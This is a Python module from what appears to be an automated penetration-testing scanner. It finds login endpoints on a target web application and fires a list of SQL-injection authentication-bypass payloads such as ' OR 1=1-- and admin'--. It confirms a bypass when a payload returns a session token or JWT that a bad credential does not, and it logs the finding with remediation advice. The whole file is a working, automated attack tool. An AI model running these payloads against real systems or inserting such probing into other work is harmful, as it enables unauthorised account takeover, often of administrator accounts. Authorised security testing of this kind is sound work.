"""Stage 5: Authentication-bypass via SQL injection on login.

Finding an injectable parameter is not the same as proving impact. The class
that pays is the login endpoint that concatenates the identifier straight into
a SQL query, so `' OR 1=1--` logs you in as the first user — usually the admin.
This fires that family of payloads at login endpoints and confirms a bypass
only when a payload yields a session/token that a known-bad credential does
not. That differential — bad creds fail, injection succeeds — is the proof,
not a status code.
"""

import re

from modules.base import BaseModule
from tools.wrappers import curl, curl_with_status

_LOGIN_PATHS = (
    "/rest/user/login", "/api/login", "/api/auth/login", "/api/users/login",
    "/api/sessions", "/api/session", "/login", "/signin", "/auth/login",
    "/user/login", "/users/login", "/account/login", "/rest/login",
)
_ID_FIELDS = ("email", "username", "user", "login", "name")
_PAYLOADS = (
    "' OR 1=1--",
    "' OR 1=1-- -",
    "' OR '1'='1' -- ",
    "admin'--",
    '" OR 1=1-- ',
    "') OR ('1'='1'-- ",
    "' OR 1=1#",
)
_JWT = re.compile(r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{6,}")


def auth_success(headers_text: str, body: str) -> bool:
    """Does this response look like a *successful* authentication?

    A JWT, an explicit token/authentication field, or a session cookie — any
    of which a failed login would not return.
    """
    body = body or ""
    if _JWT.search(body):
        return True
    if re.search(r'"(?:token|access_token|authentication|authToken)"\s*:\s*"[^"]{8,}"',
                 body):
        return True
    for line in (headers_text or "").splitlines():
        if line.lower().startswith("set-cookie:") and re.search(
                r"(?i)(session|token|auth|sid|jwt|connect\.sid)=[^;]{8,}", line):
            return True
    return False


class AuthBypass(BaseModule):
    id = "auth_bypass"
    name = "Auth Bypass (SQLi login)"
    stage = 5
    detectability = "high"
    depends_on = ["tech_detection"]
    active = True

    async def run(self) -> str:
        base = self.base_url
        endpoints = await self._login_endpoints(base)
        if not endpoints:
            self.state.skip_module(self.id, "no login endpoint found")
            return "skipped"

        confirmed = 0
        for ep in endpoints[:6]:
            if self.should_stop(reserve=10):
                break
            if await self._probe(base, ep):
                confirmed += 1

        self.state.complete_module(self.id)
        self.log(f"Auth bypass: {confirmed} confirmed across "
                 f"{len(endpoints)} login endpoint(s)")
        return "done"

    async def _login_endpoints(self, base: str) -> list:
        found = []
        for path in _LOGIN_PATHS:
            if self.should_stop(reserve=12):
                break
            url = base.rstrip("/") + path
            try:
                r = await curl_with_status(url, method="POST",
                                           data='{"email":"x","password":"x"}',
                                           timeout=10)
            except Exception:  # noqa: BLE001
                continue
            # A login endpoint answers POST with something other than a 404.
            if r.get("status") not in (0, 404, 405) or _JWT.search(
                    r.get("body", "") or ""):
                found.append(url)
        # Also pull endpoints that discovery already tagged login-ish.
        for atype in ("api_endpoint", "url"):
            for a in self.state.get_assets_by_type(atype):
                v = str(a.get("value", ""))
                if v.startswith(("http", "https")) and re.search(
                        r"/(login|signin|auth|session)", v, re.I) and v not in found:
                    found.append(v)
        return found

    async def _submit(self, url: str, field: str, value: str) -> dict:
        """One login attempt as JSON (and form if JSON is rejected)."""
        body = '{"%s":%s,"password":"pw"}' % (field, _json_str(value))
        r = await curl(url, method="POST", output="full", timeout=10, data=body,
                       headers={"Content-Type": "application/json"})
        if r.get("status") in (0, 415) or "unsupported" in (r.get("body", "") or "").lower():
            from urllib.parse import quote
            form = f"{field}={quote(value)}&password=pw"
            r = await curl(url, method="POST", output="full", timeout=10, data=form,
                           headers={"Content-Type": "application/x-www-form-urlencoded"})
        return r

    async def _probe(self, base: str, endpoint: str) -> bool:
        for field in _ID_FIELDS[:2]:
            if self.should_stop(reserve=6):
                break
            # Baseline: a credential that must fail.
            try:
                baseline = await self._submit(endpoint, field,
                                              "noone-nonexistent-xyz@example.invalid")
            except Exception:  # noqa: BLE001
                continue
            if auth_success(str(baseline.get("headers", "")),
                            baseline.get("body", "")):
                continue  # endpoint hands a session to anyone — not an injection signal
            for payload in _PAYLOADS:
                if self.should_stop(reserve=5):
                    break
                try:
                    r = await self._submit(endpoint, field, payload)
                except Exception:  # noqa: BLE001
                    continue
                if auth_success(str(r.get("headers", "")), r.get("body", "")):
                    role = ""
                    m = _JWT.search(r.get("body", "") or "")
                    if m:
                        role = _role_from_jwt(m.group(0))
                    self.state.add_finding(
                        title="Authentication bypass via SQL injection on login",
                        severity="CRITICAL", confidence="CONFIRMED",
                        category="Injection",
                        description=f"The login endpoint authenticated an SQL "
                                    f"injection payload in the '{field}' field "
                                    f"while a known-bad credential failed — a full "
                                    f"authentication bypass"
                                    + (f" yielding a '{role}' session." if role
                                       else "."),
                        evidence=[f"POST {endpoint} {field}={payload!r} → session granted",
                                  f"baseline (bad creds) → no session"]
                                 + ([f"token role: {role}"] if role else []),
                        remediation="Use parameterised queries / an ORM for the "
                                    "login lookup; never concatenate the "
                                    "identifier into SQL.",
                        asset_keys=[f"webapp:{base}"],
                        verification={"method": "sqli_auth_bypass_differential",
                                      "url": endpoint})
                    return True
        return False


def _json_str(value: str) -> str:
    import json
    return json.dumps(value)


def _role_from_jwt(token: str) -> str:
    import base64
    import json
    try:
        payload = token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload).decode("utf-8", "ignore"))
        d = data.get("data", data)
        return str(d.get("role") or d.get("email") or "")[:40]
    except Exception:  # noqa: BLE001
        return ""
